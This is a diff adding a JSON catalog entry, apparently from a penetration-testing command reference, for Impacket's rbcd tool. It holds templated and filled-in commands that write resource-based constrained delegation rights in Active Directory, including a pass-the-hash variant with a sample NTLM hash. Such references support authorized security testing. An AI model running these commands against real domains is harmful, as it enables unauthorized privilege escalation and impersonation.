@@ -1,0 +1,36 @@
+{
+  "id": "impacket-rbcd",
+  "name": "Impacket RBCD Write",
+  "command": "impacket-rbcd -dc-host <ip> -delegate-from '<computer>' -delegate-to '<target>' -action 'write' '<domain>/<user>:<password>'",
+  "description": "Write msDS-AllowedToActOnBehalfOfOtherIdentity to configure RBCD on a target",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "ldap"
+  ],
+  "tags": [
+    "impacket",
+    "rbcd",
+    "delegation",
+    "resource-based",
+    "constrained-delegation",
+    "msds-allowedtoactonbehalfofotheridentity"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-rbcd -dc-host <ip> -delegate-from '<computer>' -delegate-to '<target>' -action 'write' -hashes ':<hash>' '<domain>/<user>'"
+    },
+    {
+      "label": "Read (verify)",
+      "requires": "password",
+      "command": "impacket-rbcd -dc-host <ip> -delegate-from '<computer>' -delegate-to '<target>' -action 'read' '<domain>/<user>:<password>'"
+    }
+  ],
+  "examples": [
+    "impacket-rbcd -dc-host 192.168.1.2 -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'US-HELPDESK$' -action 'write' -hashes ':e53153fc2dc8d4c5a5839e46220717e5' 'corp.local/mgmtadmin'"
+  ]
+}
